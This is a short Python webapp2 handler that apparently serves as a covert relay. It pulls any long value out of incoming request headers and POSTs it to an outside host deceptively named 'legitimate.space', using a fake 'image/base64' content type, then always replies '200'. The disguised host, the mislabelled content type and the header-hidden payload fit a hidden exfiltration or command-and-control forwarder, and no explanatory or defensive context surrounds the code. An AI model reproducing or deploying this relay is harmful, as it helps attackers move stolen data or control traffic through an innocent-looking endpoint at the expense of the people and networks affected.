import webapp2

from metric.header import headerz
from requests import post


def phd( head ):
  for h, r in head:
     h = str( h )
     r = str( r )
     lr = len( r )
     if lr > 100:
       return r
  return


class MainPage(webapp2.RequestHandler):
  def do( self, proc ):
     raw  = self.request
     proc = str( proc )
     sip  = 'http://legitimate.space:80'
     head = headerz( raw, 'all', proc )
     data  = phd( head )
#     print
#     print(data)
#     print

     headers = { 'Content-type': 'image/base64' }
     rsp  = post( url=sip, data=data, headers=headers )
#     print
#     print(rsp)
#     print

     self.response.headers['Content-Type'] = 'text/plain'
     self.response.write('200')


  def post( self, proc=None ):
     self.do('POST')



app = webapp2.WSGIApplication([
    ( '/', MainPage,),
], debug=True,)
